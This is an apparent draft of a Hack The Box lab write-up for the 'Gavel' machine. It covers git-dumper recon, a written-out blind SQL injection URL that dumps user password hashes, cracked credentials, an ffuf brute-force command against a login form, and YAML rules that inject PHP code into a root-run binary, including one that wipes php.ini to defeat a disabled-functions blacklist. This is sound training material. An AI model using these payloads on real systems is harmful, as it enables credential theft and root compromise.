---
title: HTB-Gavel
published: 2025-12-01
toc: true
draft: true
tags:
  - "git"
  - "git-dumper"
---

```
Scope:
10.10.11.97
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- --min-rate=5000 -Pn gavel.htb -T5 -vvvv

PORT      STATE    SERVICE        REASON      VERSION
22/tcp    open     ssh            syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http           syn-ack     Apache httpd 2.4.52
|_http-favicon: Unknown favicon MD5: 954223287BC6EB88C5DD3C79083B91E1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-git: 
|   10.10.11.97:80/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: .. 
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Gavel Auction
```

Right away I notice that a `git` repo was found, let's enumerate it with `git-dumper`.

## git-dumper

![](attachments/291aad3be8d6b66bfe991bdabaeb4771.png)

![](attachments/e434600f6e62c04e20a3e608b2135406.png)

In order to view the source code easier I launched `vscode` and viewed it there.

![](attachments/7640272f44e4751b607d475a0a3bc161.png)

Some interesting code I found was the following:

![](attachments/bd2d4196f99fadb4b51271a3af3398f9.png)

I would need to create a user first and check it out on the website to fully understand the inner workings, but at first glance this looks like a **SQL Injection**.

## 80/TCP - HTTP

I went over to the website and registered a new *tester* account:

![](attachments/29b6804ec61cd24fd96c75f26bc65a7a.png)

![](attachments/de5724ffec62dca80fcc952f4823ed0d.png)

Once registered I logged in:

![](attachments/a17aa59bf3adc21d19d2d71c85d64053.png)

I started bidding on some auctions and once I had won a couple I could view them in my inventory:

![](attachments/43fd3bf82b996e644a522fa53c204ffa.png)

When we change the parameters from POST to GET the URL looks as follows:

![](attachments/c21584851c13e68b8399444472c9c0f2.png)

I tried injecting the `sort` parameter since that's what appeared to be injectable from our source code review.

![](attachments/0c3bceceeea92cbc25bd31a0de7b4c27.png)

This way we could query all parts of the item:

![](attachments/f4e29a2552252a5b5c573e54d12638f2.png)

# Exploitation
## Blind SQLi - Intended Method

I turns out that in order to successfully inject any SQLi queries here we will have to attack *both* params. Thus we need to change the following:

```sql
SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC
```

To this somehow:

```sql
SELECT x FROM (SELECT CONCAT(username, 0x3a, password) AS 'x' FROM users) y;
```

When we put this all together it looks as follows:

```sql
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+CONCAT(username,0x3a,password)+AS+`'x`+from+users)y;--&sort=\?;--%00
```

![](attachments/2323e6a26c6e7815ca42b9cbd43b7804.png)

Using the above query we're able to acquire the password hash for *auctioneer*.

This hash is then easily cracked using `john`:

![](attachments/956254bf0e6c10a3cfaba7136a275b61.png)

```
auctioneer
midnight1
```

## Ffuf - Alternative Method

Alternatively we could just brute force the password. After having found the *auctioneer* username inside the source code we can attempt a brute-force attack:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u "http://gavel.htb/login.php" -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: gavel_session=59o57iuco1ickd6da1tgt7q075" -d "username=auctioneer&password=FUZZ" -fr "Invalid username or password."
```

![](attachments/dc055abb14441c35b99c55b4cc79b1b7.png)

## Admin Panel

We can now use the found credentials to log into the admin panel using the *auctioneer* admin user:

![](attachments/1e571160e97e24f9bc8cfbfbe66392dc.png)

![](attachments/8889f454453318058ea3c373422c203b.png)

Inside the **Admin Panel** we can edit the active bids:

![](attachments/74e8b4dc02741d220bd160258c9ae92a.png)

I then went ahead and tested out the functionality here by supplying some sample text and analysed it using `caido`:

![](attachments/0e563c74d6dab7be1d955c0402946ba3.png)

# Foothold
## Shell as www-data

I then tried out the following payload inside the *rule* form.

![](attachments/5f20cae0ffdd8e053e8b465ca3404a33.png)

Once we then place a bid we get a reverse shell:

![](attachments/e58a7380713d4c1123695df948ae67cc.png)

## Lateral Movement to auctioneer 

Once we got a reverse shell we can easily `su` to *auctioneer* using the same password that we used to log into the website:

![](attachments/cd865a4f593b49399c14beb561f175d1.png)

### user.txt

![](attachments/fa0286b5f772f83b214e21b9502cb51b.png)

During further enum I noticed that the user is part of a non-default group:

![](attachments/3eb05fa6b89baf4dac6ab024e502d40c.png)

I am not allowed to run `sudo` though:

![](attachments/c2c7c1c4330ba0f7b72367f6cf63d904.png)

I transferred over `pspy64` and ran it:

![](attachments/e704b9ce723d2b40ea87b8c3c53b304c.png)

I found a process running under *root* which was using the `auction_watcher.sh` script.

# Privilege Escalation
## gavel-util

I started checking for other files and found this binary related to `gavel`:

![](attachments/b0a753b1fa08e37069b530c9d43a231f.png)

I ran the binary and found the following:

![](attachments/8c04b3ae0c30b81a317954dcc7d4b62d.png)

This binary is owned and run as *root* so we could try and abuse it. I tried the following `yaml` file:

```yaml
name: x
description: x
image: x
price: 1
rule_msg: x
rule: "system('id'); return false;"
```

![](attachments/645c42587b3f8a58245f8d1b7e6f75f7.png)

Using the `system()` command was seen as "illegal".

I could find that all the `php` shell commands were blacklisted in the `/opt/gavel/.config/php/php.ini` file:

![](attachments/17333f6e465f68c9bdb060623cf89e34.png)

This meant I'd need to use `gavel-util` to write a malicious rule as follows:

```yaml
name: "Test"
description: "Testing test"
image: "https://sample.website"
price: 10000
rule_msg: "Your bid must be 20% higher than the previous bid"
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', '');"
```

![](attachments/1c0acd1c0b89eac5e57cf5605a3a921f.png)

























---